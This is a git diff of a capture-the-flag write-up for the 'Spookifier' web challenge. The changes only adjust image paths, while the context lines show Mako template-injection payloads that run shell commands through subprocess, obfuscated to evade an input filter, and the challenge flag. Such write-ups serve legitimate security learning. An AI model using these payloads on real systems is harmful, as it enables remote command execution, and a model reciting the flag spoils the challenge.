@@ -1,12 +1,12 @@
 # Spookifier
 
-<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
 * **wappalyzer**
 
-<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
 from this info, we know that this webapp is using **`Python 3.8.15`** and **`Flask 2.0.0`** as their framework.
 
@@ -572,7 +572,7 @@ def spookify(text):
 
 this is for the font. when we entered any words, it will change the font.
 
-<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
 
 * **routes.py**
 
@@ -599,13 +599,13 @@ i just tried to check if this challenge is about SSTI and i used classic SSTI pa
 ${7*7}
 ```
 
-<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
 its now confirmed that this web is vulnerable to SSTI which means the templating engine (Mako) is vulnerable because of its response.
 
 i already tried the payload from [**PayloadAllTheThings**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#mako) but the thing is, most of the payload will returned null or Internal Server Error.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
 
 from my observation, this server has a sanitized several input or has a WAF such as `os`, `sys` and `system`.  so i must modify my code to exploit this web.
 
@@ -617,7 +617,7 @@ ${self.template.module.__builtins__['__import__']('subprocess').check_output('id
 
 i used this payload and it works.
 
-<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
 
 the output is:
 
@@ -637,7 +637,7 @@ ${self.template.module.__builtins__['__import__']('subprocess').check_output('ca
 
 tried to `cat` the `flag.txt` but the output is Internal Server Error.
 
-<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
 
 from this output, i assumed that this web is sanitized the word `flag.txt` . so i tried to obfuscate my payload to bypass the security.
 
@@ -649,7 +649,7 @@ ${self.template.module.__builtins__['__import__']('subprocess').check_output('fi
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 output:
 
@@ -669,7 +669,7 @@ ${self.template.module.__builtins__['__import__']('subprocess').check_output('c'
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
 
 **`HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`**
 
